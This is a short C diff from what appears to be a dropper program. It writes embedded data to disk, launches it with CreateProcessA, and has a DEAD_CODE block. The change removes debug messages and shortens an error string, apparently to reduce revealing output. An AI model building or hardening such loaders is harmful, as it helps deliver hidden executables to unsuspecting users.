@@ -93,11 +93,8 @@ int main(int argc, char* argv[])
 	set_name();
 	// Drop to Disk
 
-	printf("This is name [%s]\n", name);
-
 	drop(size, data);
 	// process
-	printf("Just before launch\n");
 	launch();
 #ifdef DEAD_CODE
 	// dead code
@@ -160,7 +157,7 @@ void launch()
 #else
 	BOOL err = CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (!err) {
-		printf("Create Process failed. Error: %u\n", GetLastError());
+		printf("%u\n", GetLastError());
 	}
 #endif
 }
